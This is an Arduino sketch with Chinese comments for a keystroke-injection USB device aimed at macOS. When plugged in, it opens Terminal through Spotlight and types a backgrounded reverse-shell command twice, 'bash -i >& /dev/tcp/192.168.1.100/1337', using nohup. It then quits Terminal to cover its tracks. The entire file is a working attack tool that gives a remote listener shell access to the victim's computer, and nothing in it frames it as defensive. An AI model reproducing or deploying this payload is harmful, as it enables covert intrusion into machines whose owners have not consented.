#include <Keyboard.h>

void setup() {
 Keyboard.begin();//开始键盘通讯
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(30);
  Keyboard.press(32);//按住空格，也就是command + 空格
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release(32);
  delay(100);
  Keyboard.println("terminal");  //打开终端
  delay(2000); 
  Keyboard.press(KEY_RETURN);
  delay(100); 
  Keyboard.release(KEY_RETURN);
  delay(500);
  Keyboard.println("bash"); //打开bash
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(100);//
  Keyboard.println("nohup bash -i >& /dev/tcp/192.168.1.100/1337 0>&1 &");// 利用nohup在后台执行反弹shell代码
  delay(100);
  Keyboard.press(KEY_RETURN);//
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(100);
  Keyboard.press(32);
  delay(100);
  Keyboard.release(KEY_CAPS_LOCK);   //切换输入法。
  delay(100);
  delay(100);
  Keyboard.press(KEY_LEFT_CTRL);   //另外一种切输入法操作
  delay(100);
  Keyboard.press(32);
  Keyboard.release(KEY_LEFT_CTRL);
  delay(100);
  Keyboard.release(32);
  delay(100);
  Keyboard.println("nohup bash -i >& /dev/tcp/192.168.1.100/1337 0>&1 &");// 利用nohup在后台执行反弹shell代码
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.press('q');//按下Q键
  delay(100);
  Keyboard.release('q');// 放开Q键
  Keyboard.release(KEY_LEFT_GUI);//Command+Q退出终端
  delay(1000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  Keyboard.end();//结束键盘通讯
}
void loop() {
  }
